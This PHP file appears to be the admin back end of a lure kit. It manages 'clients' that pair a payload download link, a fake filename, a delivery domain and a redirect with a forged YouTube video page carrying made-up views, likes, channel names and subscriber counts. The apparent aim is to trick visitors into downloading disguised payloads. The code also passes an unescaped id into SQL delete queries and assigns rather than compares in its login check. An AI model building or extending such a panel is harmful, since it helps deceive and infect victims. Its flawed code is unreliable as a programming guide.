<?php 

	header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");
	header("Cache-Control: post-check=0, pre-check=0", false);
	header("Pragma: no-cache");
	
	include('../config.php');
	include('functions.php');		

	$access = check_login();
	
	if(isset($access) and $access = TRUE){
	
		if(isset($_POST['action']) && $_POST['action'] == 'add_new'){

			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$cpersonal = mysql_real_escape_string($_POST['cpersonal']);
			$cname_uncrypted = mysql_real_escape_string($_POST['cname_uncrypted']);
			$cfakefn = mysql_real_escape_string($_POST['cfakefn']);
			$cmethod = mysql_real_escape_string($_POST['cmethod']);
			$clang = mysql_real_escape_string($_POST['clang']);
			$cdomain = mysql_real_escape_string($_POST['cdomain']);
			$ctemplate = mysql_real_escape_string($_POST['ctemplate']);
			$cpayload = mysql_real_escape_string($_POST['cpayload']);
			$date = time();
			
			$cname_keyword = mysql_real_escape_string($_POST['cname_keyword']);
			$cname_keyword = str_replace(' ', '_', $cname_keyword);
			$cname_main_img = mysql_real_escape_string($_POST['cname_main_img']);
			$cname_title = mysql_real_escape_string($_POST['cname_title']);
			$cname_thumb_img = mysql_real_escape_string($_POST['cname_thumb_img']);
			$cname_channel_name = mysql_real_escape_string($_POST['cname_channel_name']);
			$cname_channel_link = mysql_real_escape_string($_POST['cname_channel_link']);
			$cname_subscribers = mysql_real_escape_string($_POST['cname_subscribers']);
			$cname_views = mysql_real_escape_string($_POST['cname_views']);
			$cname_likes_p = mysql_real_escape_string($_POST['cname_likes_p']);
			$cname_likes_c = mysql_real_escape_string($_POST['cname_likes_c']);
			$cname_pubdate = mysql_real_escape_string($_POST['cname_pubdate']);
			$cname_desc = mysql_real_escape_string($_POST['cname_desc']);
			$cname_category = mysql_real_escape_string($_POST['cname_category']);
			$cname_license = mysql_real_escape_string($_POST['cname_license']);
			$cname_duration = mysql_real_escape_string($_POST['cname_duration']);
			$redirect = mysql_real_escape_string($_POST['redirect']);
			
			$cname_total_likes = intval($cname_likes_c) / intval($cname_likes_p) * 100;
			$cname_dislikes_c = intval($cname_total_likes) - intval($cname_likes_c);
			$cname_dislikes_p = 100 - intval($cname_likes_p);
			
			$watch_url = substr(base64_encode(md5($cname_uncrypted.$date)),0,10);
			
			$pattern = '/[-!$#%^&*()_+|~=`{ }\[\]:";\'<>?,\/]/';
			$cname_uncrypted = preg_replace($pattern, "_", $cname_uncrypted);
			$cfakefn = preg_replace($pattern, "_", $cfakefn);
			
			$sql_insert_nyo = "INSERT INTO `".DB_NAME."`.`youtube` (`id`,`name`,`keyword`,`big_img_link`,`cur_video_title`,`cur_video_thumb_img_url`,`cur_video_channel_name`,`cur_video_channel_link`,`cur_video_channel_subscribers`,`cur_video_views`,`cur_video_likes_p`,`cur_video_likes_с`,`cur_video_dislikes_p`,`cur_video_dislikes_с`,`cur_video_published_date`,`cur_video_descr`,`cur_video_category`,`cur_video_license`,`cur_video_duration`,`link_download`,`redirect`) VALUES (NULL,'$cname_uncrypted','$cname_keyword','$cname_main_img','$cname_title','$cname_thumb_img','$cname_channel_name','$cname_channel_link','$cname_subscribers','$cname_views','$cname_likes_p','$cname_likes_c','$cname_dislikes_p','$cname_dislikes_c','$cname_pubdate','$cname_desc','$cname_category','$cname_license','$cname_duration','$cpayload', '$redirect');";
			mysql_query($sql_insert_nyo);
				
			$sql_insert_n = "INSERT INTO `".DB_NAME."`.`clients` (`name`,`fakefn`,`date_created`,`template`,`personal`,`method`,`domain`,`lang`,`payload`,`pdf_file`,`watch_url`) VALUES ('$cname_uncrypted', '$cfakefn', '$date', '$ctemplate', '$cpersonal', '$cmethod', '$cdomain', '$clang', '$cpayload', 'none', '$watch_url');";
			mysql_query($sql_insert_n);
			
			mysql_close($link);
			
		}elseif(isset($_POST['action']) == 'remove' && isset($_POST['name'])){
			
			$cname_uncrypted = clear_salt($_POST['name']);
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$sql_get_name = "SELECT * FROM clients WHERE id = '$cname_uncrypted' LIMIT 1;";
			$dgt = mysql_query($sql_get_name);
			$rs = mysql_fetch_array($dgt);
			
			$name = $rs['name'];
			
			$sql_remove_f_clients = "DELETE FROM `".DB_NAME."`.`clients` WHERE `clients`.`id` = '$cname_uncrypted' LIMIT 1;";			
			mysql_query($sql_remove_f_clients);
			
			$sql_remove_f_youtube = "DELETE FROM `".DB_NAME."`.`youtube` WHERE `youtube`.`name` = '$name' LIMIT 1;";
			mysql_query($sql_remove_f_youtube);
			
			$sql_clear_statistics = "DELETE FROM `".DB_NAME."`.`statistics` WHERE `statistics`.`client` = '$name';";
			mysql_query($sql_clear_statistics);
			
			$sql_remove_f_ptemplates = "DELETE FROM `".DB_NAME."`.`personal_templates` WHERE `personal_templates`.`client` = '$name' LIMIT 1;";
			mysql_query($sql_remove_f_ptemplates);
			
			mysql_close($link);
			
		}elseif(isset($_POST['action']) == 'save'){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");
			
			$cpersonal = mysql_real_escape_string($_POST['cpersonal']);
			$cname_uncrypted = mysql_real_escape_string($_POST['cname_uncrypted']);
			$cname_dd = mysql_real_escape_string($_POST['cname_dd']);
			$cname_crypted = mysql_real_escape_string(clear_salt($_POST['cname_crypted']));
			$cfakefn = mysql_real_escape_string($_POST['cfakefn']);
			$cmethod = mysql_real_escape_string($_POST['cmethod']);
			$clang = mysql_real_escape_string($_POST['clang']);
			$cdomain = mysql_real_escape_string($_POST['cdomain']);
			$ctemplate = mysql_real_escape_string($_POST['ctemplate']);
			if(isset($_POST['cpdf'])){
				$cpdf = mysql_real_escape_string($_POST['cpdf']);
			}else{
				$cpdf = 'none';
			}
			
			$cpayload = mysql_real_escape_string($_POST['cpayload']);

			$cname_keyword = mysql_real_escape_string($_POST['cname_keyword']);
			$cname_main_img = mysql_real_escape_string($_POST['cname_main_img']);
			$cname_title = mysql_real_escape_string($_POST['cname_title']);
			$cname_thumb_img = mysql_real_escape_string($_POST['cname_thumb_img']);
			$cname_channel_name = mysql_real_escape_string($_POST['cname_channel_name']);
			$cname_channel_link = mysql_real_escape_string($_POST['cname_channel_link']);
			$cname_subscribers = mysql_real_escape_string($_POST['cname_subscribers']);
			$cname_views = mysql_real_escape_string($_POST['cname_views']);
			$cname_likes_p = mysql_real_escape_string($_POST['cname_likes_p']);
			$cname_likes_c = mysql_real_escape_string($_POST['cname_likes_c']);
			$cname_pubdate = mysql_real_escape_string($_POST['cname_pubdate']);
			$cname_desc = mysql_real_escape_string($_POST['cname_desc']);
			$cname_category = mysql_real_escape_string($_POST['cname_category']);
			$cname_license = mysql_real_escape_string($_POST['cname_license']);
			$cname_duration = mysql_real_escape_string($_POST['cname_duration']);
			$redirect = mysql_real_escape_string($_POST['redirect']);
			
			$cname_total_likes = intval($cname_likes_c) / intval($cname_likes_p) * 100;
			$cname_dislikes_c = intval($cname_total_likes) - intval($cname_likes_c);
			$cname_dislikes_p = 100 - intval($cname_likes_p);
			
			$pattern = '/[-!$#%^&*()_+|~=`{ }\[\]:";\'<>?,\/]/';
			$cname_uncrypted = preg_replace($pattern, "_", $cname_uncrypted);
			$cname_dd = preg_replace($pattern, "_", $cname_dd);
			$cfakefn = preg_replace($pattern, "_", $cfakefn);
			
			$sql_csave = "UPDATE `".DB_NAME."`.`clients` SET `name` = '$cname_uncrypted', `fakefn` = '$cfakefn', `template` = '$ctemplate', `personal` = '$cpersonal', `method` = '$cmethod', `domain` = '$cdomain', `lang` = '$clang', `payload` = '$cpayload', `pdf_file` = '$cpdf' WHERE `clients`.`id` = '$cname_crypted' LIMIT 1;";
			mysql_query($sql_csave);
			
			$sql_csave_youtube = "UPDATE `".DB_NAME."`.`youtube` SET `name` = '$cname_uncrypted', `keyword` = '$cname_keyword', `big_img_link` = '$cname_main_img', `cur_video_title` = '$cname_title', `cur_video_thumb_img_url` = '$cname_thumb_img', `cur_video_channel_name` = '$cname_channel_name', `cur_video_channel_link` = '$cname_channel_link', `cur_video_channel_subscribers` = '$cname_subscribers', `cur_video_views` = '$cname_views', `cur_video_likes_p` = '$cname_likes_p', `cur_video_likes_с` = '$cname_likes_c', `cur_video_dislikes_p` = '$cname_dislikes_p', `cur_video_dislikes_с` = '$cname_dislikes_c', `cur_video_published_date` = '$cname_pubdate', `cur_video_descr` = '$cname_desc', `cur_video_category` = '$cname_category', `cur_video_license` = '$cname_license', `cur_video_duration` = '$cname_duration', `redirect` = '$redirect' WHERE `youtube`.`name` = '$cname_dd' LIMIT 1;";
			mysql_query($sql_csave_youtube);
			
			mysql_close($link);
			
		}elseif(isset($_GET['name']) && !isset($_GET['action']) && is_scalar($_GET['name'])){
			
			$link = mysql_connect(DB_HOST, DB_USER, DB_PASS);
			mysql_select_db(DB_NAME, $link);
			mysql_set_charset("utf8");		
		
			$c_name_uncr = mysql_real_escape_string(clear_salt($_GET['name']));
			$c_name = mysql_real_escape_string($_GET['name']);
			
			$sql_query = "SELECT * FROM clients WHERE id = '$c_name_uncr'";	
			$do = mysql_query($sql_query);
			$result = mysql_fetch_array($do);
			
			$c_name_uncr1 = $result['name'];
			$sql_query_youtube = "SELECT * FROM youtube WHERE name = '$c_name_uncr1'";	
			$do_youtube = mysql_query($sql_query_youtube);
			$result_youtube = mysql_fetch_array($do_youtube);
			
			@require('./tpl/client_view_youtube.tpl');
			
			mysql_close($link);
			
		}else{
			@header("Location:./index");
			exit();
		}
	
	}else{
		@header("Location: ../login");
		exit();
	}
?>
